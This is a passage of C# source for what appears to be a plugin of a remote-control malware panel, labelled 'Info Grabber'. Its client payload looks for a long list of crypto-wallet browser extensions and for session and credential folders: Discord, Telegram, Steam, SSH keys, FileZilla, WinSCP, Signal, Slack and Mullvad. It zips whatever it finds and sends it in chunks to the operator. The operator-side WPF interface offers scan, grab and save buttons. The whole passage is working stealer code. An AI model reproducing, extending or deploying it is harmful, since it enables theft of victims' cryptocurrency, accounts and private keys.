            { ""oort_chrome"",         new WalletDef(""OORT Wallet (Chrome)"",     GetChromiumExtPath(""cflgahhmjlmnjbikhakapcfkpbcmllam""), ""*"") },
            { ""koala_chrome"",        new WalletDef(""Koala Wallet (Chrome)"",    GetChromiumExtPath(""lnnnmfcpbkafcpgdilckhmhbkkbpkmid""), ""*"") },
            { ""blade_chrome"",        new WalletDef(""Blade Hedera (Chrome)"",    GetChromiumExtPath(""abogmiocnneedmmepnohnhlijcjpcifd""), ""*"") },
            { ""parallel_chrome"",     new WalletDef(""Parallel Wallet (Chrome)"", GetChromiumExtPath(""jbkgjmpfammbgejcpedggoefddacbdia""), ""*"") },
            { ""fact_chrome"",         new WalletDef(""FACT Wallet (Chrome)"",     GetChromiumExtPath(""idpdilbfamoopcfofbipefhmmnflljfi""), ""*"") },
            { ""orange_chrome"",       new WalletDef(""Orange Wallet (Chrome)"",   GetChromiumExtPath(""glmhbknppefdmpemdmjnjlinpbclokhn""), ""*"") },
            { ""luckycoin_chrome"",    new WalletDef(""Lucky Coin Wallet (Chrome)"",GetChromiumExtPath(""hfbglbedehonhmcljhlomlbjgmblieip""), ""*"") },
            { ""monsta_chrome"",       new WalletDef(""Monsta Wallet (Chrome)"",   GetChromiumExtPath(""hpbgcgmiemanfelegbndmhieiigkackl""), ""*"") },
            { ""surf_chrome"",         new WalletDef(""Surf Wallet (Chrome)"",     GetChromiumExtPath(""emeeapjkbcbpbpgaagfchmcgglmebnen""), ""*"") },
            { ""portkey_chrome"",      new WalletDef(""Portkey Wallet (Chrome)"",  GetChromiumExtPath(""iglbgmakmggfkoidiagnhknlndljlolb""), ""*"") },
            { ""bittensor_chrome"",    new WalletDef(""Bittensor Wallet (Chrome)"",GetChromiumExtPath(""bdgmdoedahdcjmpmifafdhnffjinddgc""), ""*"") },
            { ""tomo_chrome"",         new WalletDef(""Tomo Wallet (Chrome)"",     GetChromiumExtPath(""pfccjkejcgoppjnllalolplgogenfojk""), ""*"") },
            { ""stamp_chrome"",        new WalletDef(""Stamp Wallet (Chrome)"",    GetChromiumExtPath(""ldcihfaojdpmhjkhioilfjjckehehddg""), ""*"") },
            { ""mojito_chrome"",       new WalletDef(""Mojito Wallet (Chrome)"",   GetChromiumExtPath(""hbnpcbochkgodkmmicbhfpmmkhbfbhim""), ""*"") },
            { ""dogelabs_chrome"",     new WalletDef(""Doge Labs Wallet (Chrome)"",GetChromiumExtPath(""jiepnaheligkibgcjgjepjfppgbcghmp""), ""*"") },
            { ""polymesh_chrome"",     new WalletDef(""Polymesh Wallet (Chrome)"", GetChromiumExtPath(""jojhfeoedkpkglbfimdfabpdfjaoolaf""), ""*"") },
            { ""guwallet_chrome"",     new WalletDef(""GU Wallet (Chrome)"",       GetChromiumExtPath(""nfinomegcaccbhchhgflladpfbajihdf""), ""*"") },
            { ""kaia_chrome"",         new WalletDef(""Kaia Wallet (Chrome)"",     GetChromiumExtPath(""jblndlipeogpafnldhgmapagcccfchpi""), ""*"") },
            { ""starkey_chrome"",      new WalletDef(""StarKey Wallet (Chrome)"",  GetChromiumExtPath(""hcjhpkgbmechpabifbggldplacolbkoh""), ""*"") },
            { ""kabila_chrome"",       new WalletDef(""Kabila Wallet (Chrome)"",   GetChromiumExtPath(""cnoepnljjcacmnjnopbhjelpmfokpijm""), ""*"") },
            { ""athene_chrome"",       new WalletDef(""Athene Wallet (Chrome)"",   GetChromiumExtPath(""mfalklfpognjpjfbfllclbfjieknodid""), ""*"") },
            { ""abcwallet_chrome"",    new WalletDef(""ABC Wallet (Chrome)"",      GetChromiumExtPath(""mlhakagmgkmonhdonhkpjeebfphligng""), ""*"") },
            { ""hashpass_chrome"",     new WalletDef(""HashPass Wallet (Chrome)"", GetChromiumExtPath(""flhpobcpjeilaheadnpdkkinakogbdhb""), ""*"") },
            { ""shellwallet_chrome"",  new WalletDef(""Shell Wallet (Chrome)"",    GetChromiumExtPath(""kbdcddcmgoplfockflacnnefaehaiocb""), ""*"") },
            { ""razor_chrome"",        new WalletDef(""Razor Wallet (Chrome)"",    GetChromiumExtPath(""fdcnegogpncmfejlfnffnofpngdiejii""), ""*"") },
            { ""typhon_chrome"",       new WalletDef(""Typhon Wallet (Chrome)"",   GetChromiumExtPath(""kfdniefadaanbjodldohaedphafoffoh""), ""*"") },
            { ""salmon_chrome"",       new WalletDef(""Salmon Wallet (Chrome)"",   GetChromiumExtPath(""ejbidfepgijlcgahbmbckmnaljagjoll""), ""*"") },
            { ""clown_chrome"",        new WalletDef(""Clown Wallet (Chrome)"",    GetChromiumExtPath(""bipdhagncpgaccgdbddmbpcabgjikfkn""), ""*"") },
            { ""haha_chrome"",         new WalletDef(""HaHa Wallet (Chrome)"",     GetChromiumExtPath(""andhndehpcjpmneneealacgnmealilal""), ""*"") },
            { ""suku_chrome"",         new WalletDef(""Suku Wallet (Chrome)"",     GetChromiumExtPath(""fopmedgnkfpebgllppeddmmochcookhc""), ""*"") },
            { ""viction_chrome"",      new WalletDef(""Viction Wallet (Chrome)"",  GetChromiumExtPath(""nopnfnlbinpfoihclomelncopjiioain""), ""*"") },
            { ""bitgreen_chrome"",     new WalletDef(""Bitgreen Wallet (Chrome)"", GetChromiumExtPath(""elalghlhoepcjfaedkcmjolahamlnjcp""), ""*"") },
            { ""wizz_chrome"",         new WalletDef(""Wizz Wallet (Chrome)"",     GetChromiumExtPath(""ghlmndacnhlaekppcllcpcjjjomjkjpg""), ""*"") },
            { ""iconex_chrome"",       new WalletDef(""ICONex (Chrome)"",          GetChromiumExtPath(""flpiciilemghbmfalicajoolhkkenfel""), ""*"") },
            { ""tezbox_chrome"",       new WalletDef(""TezBox (Chrome)"",          GetChromiumExtPath(""mnfifefkajgofkcjkemidiaecocnkjeh""), ""*"") },
            { ""cyano_chrome"",        new WalletDef(""Cyano Wallet (Chrome)"",    GetChromiumExtPath(""dkdedlpgdmmkkfjabffeganieamfklkm""), ""*"") },
            { ""leaf_chrome"",         new WalletDef(""Leaf Wallet (Chrome)"",     GetChromiumExtPath(""cihmoadaighcejopammfbmddcmdekcje""), ""*"") },
            { ""hycon_chrome"",        new WalletDef(""Hycon Lite (Chrome)"",      GetChromiumExtPath(""bcopgchhojmggmffilplmbdicgaihlkp""), ""*"") },
            { ""ironvest_chrome"",     new WalletDef(""IronVest (Chrome)"",        GetChromiumExtPath(""epanfjkfahimkgomnigadpkobaefekcd""), ""*"") },
            { ""pali2_chrome"",        new WalletDef(""Pali Wallet (Chrome)"",     GetChromiumExtPath(""mgffkfbidihjpoaomajlbgchddlicgpn""), ""*"") },
            { ""fewcha2_chrome"",      new WalletDef(""Fewcha (Chrome)"",          GetChromiumExtPath(""ebfidpplhabeedpnhjnobghokpiioolj""), ""*"") },
            { ""pontem2_chrome"",      new WalletDef(""Pontem (Chrome)"",          GetChromiumExtPath(""phkbamefinggmakgklpkljjmgibohnba""), ""*"") },
            { ""temple2_chrome"",      new WalletDef(""Temple (Chrome)"",          GetChromiumExtPath(""ookjlbkiijinhpmnjffcofjonbfbgaoc""), ""*"") },
            { ""sender2_chrome"",      new WalletDef(""Sender (Chrome)"",          GetChromiumExtPath(""epapihdplajcdnnkdeiahlgigofloibg""), ""*"") },
            { ""cryptocom2_chrome"",   new WalletDef(""Crypto.com (Chrome)"",      GetChromiumExtPath(""hifafgmccdpekplomjjkcfgodnhcellj""), ""*"") },
            { ""xmrpt_chrome"",        new WalletDef(""XMR.PT (Chrome)"",          GetChromiumExtPath(""fbngpjehhhjfbgnacglfamkjeeomgncn""), ""*"") },

            // --- Multi-browser wallets (Edge, Brave, Firefox) ---
            { ""metamask_edge"",       new WalletDef(""MetaMask (Edge)"",          GetEdgeExtPath(""ejbalbakoplchlghecdalmeeeajnimhm""),       ""*"") },
            { ""metamask_firefox"",    new WalletDef(""MetaMask (Firefox)"",       GetFirefoxExtPath(""{aa812bee-45c5-40e6-a097-950eb2e4b261}""), ""*"") },
            { ""brave_wallet"",        new WalletDef(""Brave Wallet"",             GetBraveExtPath(""odbfpeeihdkbihmopkbjmoonfanlbfcl""),       ""*"") },
        };

        private static string GetChromiumExtPath(string extId)
        {
            return @""%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\"" + extId;
        }

        private static string GetEdgeExtPath(string extId)
        {
            return @""%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Extension Settings\"" + extId;
        }

        private static string GetBraveExtPath(string extId)
        {
            return @""%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings\"" + extId;
        }

        private static string GetFirefoxExtPath(string extId)
        {
            string profilesRoot = Environment.ExpandEnvironmentVariables(@""%APPDATA%\Mozilla\Firefox\Profiles"");
            if (Directory.Exists(profilesRoot))
            {
                foreach (string dir in Directory.GetDirectories(profilesRoot))
                {
                    string extDir = Path.Combine(dir, ""storage"", ""default"", ""moz-extension+++"" + extId.Replace(""{"", """").Replace(""}"", """"), ""idb"");
                    if (Directory.Exists(extDir))
                        return extDir;
                }
            }
            return Path.Combine(profilesRoot, ""__no_profile__"", extId);
        }

        private List<ScanEntry> _scanResults = new List<ScanEntry>();
        private class ScanEntry { public int Index; public string Prefix; public string Key; public string Path; }

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            await _send(new byte[] { 0xFE });

            try
            {
                while (true)
                {
                    byte[] data = await receiveData();
                    if (data == null || data.Length == 0) break;

                    byte cmd = data[0];
                    switch (cmd)
                    {
                        case 0x01:
                        {
                            byte flags = data.Length > 1 ? data[1] : (byte)0x01;
                            await ScanAll(flags);
                            break;
                        }
                        case 0x02:
                            if (data.Length > 1)
                                await GrabByIndex(data[1]);
                            break;
                        case 0x03:
                            await GrabAll();
                            break;
                        case 0x0A:
                            if (data.Length > 1)
                                await GrabByIndex(data[1]);
                            break;
                        case 0x0B:
                            if (data.Length > 1)
                                await GrabByIndex(data[1]);
                            break;
                    }
                }
            }
            catch { }
        }

        private static readonly Dictionary<string, string> SessionPaths = new Dictionary<string, string>
        {
            { ""discord"",      @""%APPDATA%\discord\Local Storage\leveldb"" },
            { ""discordptb"",   @""%APPDATA%\discordptb\Local Storage\leveldb"" },
            { ""discordcanary"",@""%APPDATA%\discordcanary\Local Storage\leveldb"" },
            { ""telegram"",     @""%APPDATA%\Telegram Desktop\tdata"" },
            { ""steam"",        @""%ProgramFiles(x86)%\Steam\config"" },
            { ""steamssfn"",    @""%ProgramFiles(x86)%\Steam\ssfn"" },
            { ""sshkeys"",      @""%USERPROFILE%\.ssh"" },
            { ""filezilla"",    @""%APPDATA%\FileZilla"" },
            { ""winscp"",       @""%APPDATA%\WinSCP"" },
            { ""minecraft"",    @""%APPDATA%\.minecraft"" },
            { ""signal"",       @""%APPDATA%\Signal"" },
            { ""slack"",        @""%APPDATA%\Slack"" },
            { ""teams"",        @""%APPDATA%\Microsoft\Teams"" },
            { ""whatsapp"",     @""%APPDATA%\WhatsApp"" },
            { ""skype"",        @""%APPDATA%\Skype"" },
        };
        private static readonly Dictionary<string, string> MullvadPaths = new Dictionary<string, string>
        {
            { ""mullvad"",      @""%APPDATA%\Mullvad VPN"" },
        };

        private async Task ScanAll(byte flags)
        {
            Exception scanError = null;
            try
            {
                _scanResults.Clear();
                int idx = 0;

                if ((flags & 0x01) != 0)
                {
                    foreach (var kvp in WalletDefinitions)
                    {
                        string expandedPath = Environment.ExpandEnvironmentVariables(kvp.Value.BasePath);
                        bool exists = Directory.Exists(expandedPath);
                        if (!exists && kvp.Value.FilePattern == ""wallet.dat"")
                        {
                            string fp = Path.Combine(expandedPath, ""wallet.dat"");
                            if (expandedPath.EndsWith(""wallet.dat"")) fp = expandedPath;
                            exists = File.Exists(fp);
                        }
                        if (exists)
                        {
                            _scanResults.Add(new ScanEntry { Index = idx, Prefix = ""W"", Key = kvp.Key, Path = expandedPath });
                            idx++;
                        }
                    }
                }

                if ((flags & 0x02) != 0)
                {
                    foreach (var kvp in SessionPaths)
                    {
                        string expandedPath = Environment.ExpandEnvironmentVariables(kvp.Value);
                        if (Directory.Exists(expandedPath))
                        {
                            _scanResults.Add(new ScanEntry { Index = idx, Prefix = ""S"", Key = kvp.Key, Path = expandedPath });
                            idx++;
                        }
                    }
                }

                if ((flags & 0x04) != 0)
                {
                    foreach (var kvp in MullvadPaths)
                    {
                        string expandedPath = Environment.ExpandEnvironmentVariables(kvp.Value);
                        if (Directory.Exists(expandedPath))
                        {
                            _scanResults.Add(new ScanEntry { Index = idx, Prefix = ""M"", Key = kvp.Key, Path = expandedPath });
                            idx++;
                        }
                    }
                }

                var lines = new List<string>();
                foreach (var se in _scanResults)
                {
                    string displayName = se.Key;
                    WalletDef wd = null;
                    if (se.Prefix == ""W"" && WalletDefinitions.TryGetValue(se.Key, out wd))
                        displayName = wd.DisplayName;
                    long size = GetDirectorySize(se.Path);
                    string sizeStr = FormatSize(size);
                    lines.Add(se.Index + ""|"" + se.Prefix + "":"" + se.Key + ""|"" + displayName + ""|"" + se.Path + ""|"" + sizeStr);
                }

                string result = string.Join(""\n"", lines);
                byte[] resultBytes = Encoding.UTF8.GetBytes(result);
                byte[] msg = new byte[resultBytes.Length + 1];
                msg[0] = 0x01;
                Buffer.BlockCopy(resultBytes, 0, msg, 1, resultBytes.Length);
                await _send(msg);
            }
            catch (Exception ex)
            {
                scanError = ex;
            }

            if (scanError != null)
            {
                await SendError(""Scan failed: "" + scanError.Message);
            }
        }

        private async Task GrabByIndex(byte combinedIdx)
        {
            var se = _scanResults.Find(s => s.Index == combinedIdx);
            if (se == null)
            {
                await SendError(""Item index not found: "" + combinedIdx);
                return;
            }

            switch (se.Prefix)
            {
                case ""W"":
                    WalletDef wd = null;
                    if (WalletDefinitions.TryGetValue(se.Key, out wd))
                    {
                        await GrabPath(combinedIdx, wd.DisplayName, se.Path, wd.FilePattern);
                    }
                    break;
                case ""S"":
                    await GrabPath(combinedIdx, se.Key, se.Path, ""*"");
                    break;
                case ""M"":
                    await GrabPath(combinedIdx, se.Key, se.Path, ""*"");
                    break;
            }
            await _send(new byte[] { 0x05 });
        }

        private async Task GrabAll()
        {
            foreach (var se in _scanResults)
            {
                byte idx = (byte)se.Index;
                switch (se.Prefix)
                {
                    case ""W"":
                        WalletDef wd = null;
                        if (WalletDefinitions.TryGetValue(se.Key, out wd))
                            await GrabPath(idx, wd.DisplayName, se.Path, wd.FilePattern);
                        break;
                    case ""S"":
                        await GrabPath(idx, se.Key, se.Path, ""*"");
                        break;
                    case ""M"":
                        await GrabPath(idx, se.Key, se.Path, ""*"");
                        break;
                }
            }
            await _send(new byte[] { 0x05 });
        }

        private async Task GrabPath(byte itemIdx, string displayName, string expandedPath, string filePattern)
        {
            Exception grabError = null;
            try
            {
                string path = expandedPath;
                await SendStatus(itemIdx, ""Zipping "" + displayName + ""..."");

                using (var ms = new MemoryStream())
                {
                    using (var zip = new ZipArchive(ms, ZipArchiveMode.Create, true))
                    {
                        if (filePattern == ""wallet.dat"")
                        {
                            string walletFile = Path.Combine(path, ""wallet.dat"");
                            if (File.Exists(walletFile))
                                AddFileToZip(zip, walletFile, ""wallet.dat"");
                            else if (File.Exists(path))
                                AddFileToZip(zip, path, Path.GetFileName(path));
                        }
                        else if (Directory.Exists(path))
                        {
                            AddDirectoryToZip(zip, path, displayName);
                        }
                    }

                    byte[] zipData = ms.ToArray();

                    const int chunkSize = 512 * 1024;
                    if (zipData.Length <= chunkSize)
                    {
                        byte[] msg = new byte[zipData.Length + 2];
                        msg[0] = 0x02;
                        msg[1] = itemIdx;
                        Buffer.BlockCopy(zipData, 0, msg, 2, zipData.Length);
                        await _send(msg);
                    }
                    else
                    {
                        byte[] sizeMsg = new byte[6];
                        sizeMsg[0] = 0x06;
                        sizeMsg[1] = itemIdx;
                        byte[] sizeBytes = BitConverter.GetBytes(zipData.Length);
                        Buffer.BlockCopy(sizeBytes, 0, sizeMsg, 2, 4);
                        await _send(sizeMsg);

                        int offset = 0;
                        while (offset < zipData.Length)
                        {
                            int remaining = zipData.Length - offset;
                            int thisChunk = Math.Min(remaining, chunkSize);
                            byte[] chunkMsg = new byte[thisChunk + 2];
                            chunkMsg[0] = 0x07;
                            chunkMsg[1] = itemIdx;
                            Buffer.BlockCopy(zipData, offset, chunkMsg, 2, thisChunk);
                            await _send(chunkMsg);
                            offset += thisChunk;
                        }

                        await _send(new byte[] { 0x08, itemIdx });
                    }

                    await SendStatus(itemIdx, ""Done ("" + FormatSize(zipData.Length) + "")"");
                }
            }
            catch (Exception ex)
            {
                grabError = ex;
            }

            if (grabError != null)
            {
                await SendStatus(itemIdx, ""Error: "" + grabError.Message);
            }
        }

        private void AddFileToZip(ZipArchive zip, string filePath, string entryName)
        {
            try
            {
                using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    var entry = zip.CreateEntry(entryName, CompressionLevel.Fastest);
                    using (var es = entry.Open())
                    {
                        fs.CopyTo(es);
                    }
                }
            }
            catch { }
        }

        private void AddDirectoryToZip(ZipArchive zip, string dirPath, string rootName)
        {
            try
            {
                foreach (string file in Directory.GetFiles(dirPath, ""*"", SearchOption.AllDirectories))
                {
                    try
                    {
                        string relativePath = file.Substring(dirPath.Length).TrimStart('\\', '/');
                        string entryName = rootName + ""/"" + relativePath.Replace('\\', '/');

                        using (var fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        {
                            if (fs.Length > 50 * 1024 * 1024) continue;

                            var entry = zip.CreateEntry(entryName, CompressionLevel.Fastest);
                            using (var es = entry.Open())
                            {
                                fs.CopyTo(es);
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private async Task SendStatus(byte walletIdx, string text)
        {
            byte[] textBytes = Encoding.UTF8.GetBytes(text);
            byte[] msg = new byte[textBytes.Length + 2];
            msg[0] = 0x04;
            msg[1] = walletIdx;
            Buffer.BlockCopy(textBytes, 0, msg, 2, textBytes.Length);
            await _send(msg);
        }

        private async Task SendError(string text)
        {
            byte[] textBytes = Encoding.UTF8.GetBytes(text);
            byte[] msg = new byte[textBytes.Length + 1];
            msg[0] = 0x03;
            Buffer.BlockCopy(textBytes, 0, msg, 1, textBytes.Length);
            await _send(msg);
        }

        private static long GetDirectorySize(string path)
        {
            long size = 0;
            try
            {
                if (File.Exists(path))
                    return new FileInfo(path).Length;

                if (Directory.Exists(path))
                {
                    foreach (string file in Directory.GetFiles(path, ""*"", SearchOption.AllDirectories))
                    {
                        try { size += new FileInfo(file).Length; } catch { }
                    }
                }
            }
            catch { }
            return size;
        }

        private static string FormatSize(long bytes)
        {
            if (bytes < 1024) return bytes + "" B"";
            if (bytes < 1024 * 1024) return (bytes / 1024.0).ToString(""F1"") + "" KB"";
            return (bytes / (1024.0 * 1024.0)).ToString(""F1"") + "" MB"";
        }

        private class WalletDef
        {
            public string DisplayName;
            public string BasePath;
            public string FilePattern;

            public WalletDef(string displayName, string basePath, string filePattern)
            {
                DisplayName = displayName;
                BasePath = basePath;
                FilePattern = filePattern;
            }
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            var ui = new WalletGrabUI(context);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;

            if (_clientUIs.TryGetValue(clientId, out var ui))
            {
                byte msgType = data[0];

                switch (msgType)
                {
                    case 0xFE:
                        ui.OnClientReady();
                        break;
                    case 0x01:
                        if (data.Length > 1)
                        {
                            string listText = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                            ui.OnWalletListReceived(listText);
                        }
                        else
                        {
                            ui.OnWalletListReceived("");
                        }
                        break;
                    case 0x02:
                        if (data.Length > 2)
                        {
                            byte walletIdx = data[1];
                            byte[] zipData = new byte[data.Length - 2];
                            Buffer.BlockCopy(data, 2, zipData, 0, zipData.Length);
                            ui.OnZipDataReceived(walletIdx, zipData);
                        }
                        break;
                    case 0x03:
                        if (data.Length > 1)
                        {
                            string error = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                            ui.OnError(error);
                        }
                        break;
                    case 0x04:
                        if (data.Length > 2)
                        {
                            byte walletIdx = data[1];
                            string status = Encoding.UTF8.GetString(data, 2, data.Length - 2);
                            ui.OnWalletStatus(walletIdx, status);
                        }
                        break;
                    case 0x05:
                        ui.OnAllDone();
                        break;
                    case 0x06:
                        if (data.Length >= 6)
                        {
                            byte walletIdx = data[1];
                            int totalSize = BitConverter.ToInt32(data, 2);
                            ui.OnChunkedStart(walletIdx, totalSize);
                        }
                        break;
                    case 0x07:
                        if (data.Length > 2)
                        {
                            byte walletIdx = data[1];
                            byte[] chunk = new byte[data.Length - 2];
                            Buffer.BlockCopy(data, 2, chunk, 0, chunk.Length);
                            ui.OnChunkReceived(walletIdx, chunk);
                        }
                        break;
                    case 0x08:
                        if (data.Length >= 2)
                        {
                            byte walletIdx = data[1];
                            ui.OnChunkedDone(walletIdx);
                        }
                        break;
                }
            }

            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui))
            {
                ui.OnError("Client disconnected.");
                ui.Dispose();
            }
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
        }
    }

    // ==================== WALLET INFO MODEL ====================

    [SupportedOSPlatform("windows")]
    public class WalletInfo
    {
        public int Index { get; set; }
        public string Id { get; set; }
        public string Category { get; set; }
        public string DisplayName { get; set; }
        public string Path { get; set; }
        public string Size { get; set; }
        public string Status { get; set; }
        public byte[] ZipData { get; set; }
        public bool Grabbed { get; set; }

        public MemoryStream ChunkBuffer { get; set; }
        public int ExpectedSize { get; set; }
    }

    // ==================== UI ====================

    [SupportedOSPlatform("windows")]
    public class WalletGrabUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private Color BackgroundColorVal => C("BackgroundColor");
        private Color SurfaceColorVal => C("SurfaceColor");
        private Color SurfaceLightColorVal => C("SurfaceLightColor");
        private Color BorderColorVal => C("BorderColor");
        private Color TextPrimaryColorVal => C("TextPrimaryColor");
        private Color TextSecondaryColorVal => C("TextSecondaryColor");
        private Color PrimaryColorVal => C("PrimaryColor");
        private Color PrimaryHoverColorVal => C("PrimaryHoverColor");
        private Color DangerColorVal => C("DangerColor");
        private Color SuccessColorVal => C("SuccessColor");
        private Color SuccessHoverColorVal => C("SuccessHoverColor");
        private Color WarningColorVal => C("WarningColor");
        private Color DisabledBgColorVal => C("ButtonBgColor");
        private Color ButtonBorderClr => C("ButtonBorderColor");

        private SolidColorBrush BackgroundBrush => B("BackgroundBrush");
        private SolidColorBrush SurfaceBrush => B("SurfaceBrush");
        private SolidColorBrush SurfaceLightBrush => B("SurfaceLightBrush");
        private SolidColorBrush BorderBrushTheme => B("BorderBrush");
        private SolidColorBrush TextPrimaryBrush => B("TextPrimaryBrush");
        private SolidColorBrush TextSecondaryBrush => B("TextSecondaryBrush");

        private readonly PluginContext _context;
        private readonly ListView _walletList;
        private readonly TextBlock _statusLabel;
        private readonly TextBlock _summaryLabel;
        private readonly Button _scanButton;
        private readonly Button _grabAllButton;
        private readonly Button _grabSelectedButton;
        private readonly Button _saveButton;
        private readonly Button _saveAllButton;
        private readonly CheckBox _chkWallets;
        private readonly CheckBox _chkSessions;
        private readonly CheckBox _chkMullvad;
        private readonly TextBox _logBox;

        private readonly List<WalletInfo> _wallets = new();
        private bool _clientReady;
        private bool _busy;
        private int _totalGrabbed;
        private long _totalBytes;

        public WalletGrabUI(PluginContext context)
        {
            _context = context;

            var mainGrid = new Grid();
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(140) });
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            // ===== TOOLBAR =====
            var toolbar = new Border
            {
                Background = SurfaceBrush,
                BorderBrush = BorderBrushTheme,
                BorderThickness = new Thickness(0, 0, 0, 1),
                Padding = new Thickness(10, 8, 10, 8)
            };

            var toolbarGrid = new Grid();
            toolbarGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            toolbarGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            toolbarGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            toolbarGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            toolbarGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            toolbarGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            toolbarGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
            toolbarGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            toolbarGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });

            _scanButton = CreateThemedButton("Scan", PrimaryColorVal, PrimaryHoverColorVal);
            _scanButton.IsEnabled = false;
            _scanButton.Click += ScanButton_Click;
            Grid.SetColumn(_scanButton, 0);

            _grabAllButton = CreateThemedButton("Grab All", SuccessColorVal, SuccessHoverColorVal);
            _grabAllButton.IsEnabled = false;
            _grabAllButton.Margin = new Thickness(6, 0, 0, 0);
            _grabAllButton.Click += GrabAllButton_Click;
            Grid.SetColumn(_grabAllButton, 1);

            _grabSelectedButton = CreateThemedButton("Grab Selected", SurfaceLightColorVal, C("ButtonBgHoverColor"));
            _grabSelectedButton.IsEnabled = false;
            _grabSelectedButton.Margin = new Thickness(6, 0, 0, 0);
            _grabSelectedButton.Click += GrabSelectedButton_Click;
            Grid.SetColumn(_grabSelectedButton, 2);

            _chkWallets = CreateThemedCheckbox("Wallets", true);
            Grid.SetColumn(_chkWallets, 3);

            _chkSessions = CreateThemedCheckbox("Sessions", true);
            Grid.SetColumn(_chkSessions, 4);

            _chkMullvad = CreateThemedCheckbox("Mullvad", true);
            Grid.SetColumn(_chkMullvad, 5);

            _statusLabel = new TextBlock
            {
                Text = $"Info Grabber — {TruncateId(context.ClientId)} — Waiting for client...",
                Foreground = TextSecondaryBrush,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(12, 0, 0, 0),
                FontSize = 12
            };
            Grid.SetColumn(_statusLabel, 6);

            _saveButton = CreateThemedButton("Save Selected", SurfaceLightColorVal, C("ButtonBgHoverColor"));
            _saveButton.IsEnabled = false;
            _saveButton.Margin = new Thickness(6, 0, 0, 0);
            _saveButton.Click += SaveButton_Click;
            Grid.SetColumn(_saveButton, 7);

            _saveAllButton = CreateThemedButton("Save All", SurfaceLightColorVal, C("ButtonBgHoverColor"));
            _saveAllButton.IsEnabled = false;
            _saveAllButton.Margin = new Thickness(6, 0, 0, 0);
            _saveAllButton.Click += SaveAllButton_Click;
            Grid.SetColumn(_saveAllButton, 8);

            toolbarGrid.Children.Add(_scanButton);
            toolbarGrid.Children.Add(_grabAllButton);
            toolbarGrid.Children.Add(_grabSelectedButton);
            toolbarGrid.Children.Add(_chkWallets);
            toolbarGrid.Children.Add(_chkSessions);
            toolbarGrid.Children.Add(_chkMullvad);
            toolbarGrid.Children.Add(_statusLabel);
            toolbarGrid.Children.Add(_saveButton);
            toolbarGrid.Children.Add(_saveAllButton);
            toolbar.Child = toolbarGrid;
            Grid.SetRow(toolbar, 0);
            mainGrid.Children.Add(toolbar);

            // ===== WALLET LIST =====
            _walletList = new ListView
            {
                Background = BackgroundBrush,
                Foreground = TextPrimaryBrush,
                BorderThickness = new Thickness(0),
                SelectionMode = SelectionMode.Extended,
                Margin = new Thickness(0)
            };

            var gridView = new GridView();
            gridView.Columns.Add(CreateColumn("Name", "DisplayName", 200));
            gridView.Columns.Add(CreateColumn("Category", "Category", 80));
            gridView.Columns.Add(CreateColumn("Path", "Path", 300));
            gridView.Columns.Add(CreateColumn("Size", "Size", 90));
            gridView.Columns.Add(CreateColumn("Status", "Status", 200));

            _walletList.View = gridView;

            var walletItemStyle = new Style(typeof(ListViewItem));
            walletItemStyle.Setters.Add(new Setter(Control.ForegroundProperty, TextPrimaryBrush));
            walletItemStyle.Setters.Add(new Setter(Control.BackgroundProperty, Brushes.Transparent));
            walletItemStyle.Setters.Add(new Setter(Control.PaddingProperty, new Thickness(2)));
            walletItemStyle.Setters.Add(new Setter(Control.MarginProperty, new Thickness(0)));
            walletItemStyle.Setters.Add(new Setter(Control.BorderThicknessProperty, new Thickness(0)));
            walletItemStyle.Setters.Add(new Setter(Control.HorizontalContentAlignmentProperty, HorizontalAlignment.Stretch));

            var walletHoverTrigger = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true };
            walletHoverTrigger.Setters.Add(new Setter(Control.ForegroundProperty, TextPrimaryBrush));
            walletHoverTrigger.Setters.Add(new Setter(Control.BackgroundProperty, SurfaceLightBrush));
            walletItemStyle.Triggers.Add(walletHoverTrigger);

            var walletSelectedTrigger = new Trigger { Property = System.Windows.Controls.Primitives.Selector.IsSelectedProperty, Value = true };
            walletSelectedTrigger.Setters.Add(new Setter(Control.ForegroundProperty, TextPrimaryBrush));
            walletSelectedTrigger.Setters.Add(new Setter(Control.BackgroundProperty, new SolidColorBrush(PrimaryColorVal)));
            walletItemStyle.Triggers.Add(walletSelectedTrigger);

            var walletSelectedHoverTrigger = new MultiTrigger();
            walletSelectedHoverTrigger.Conditions.Add(new Condition(UIElement.IsMouseOverProperty, true));
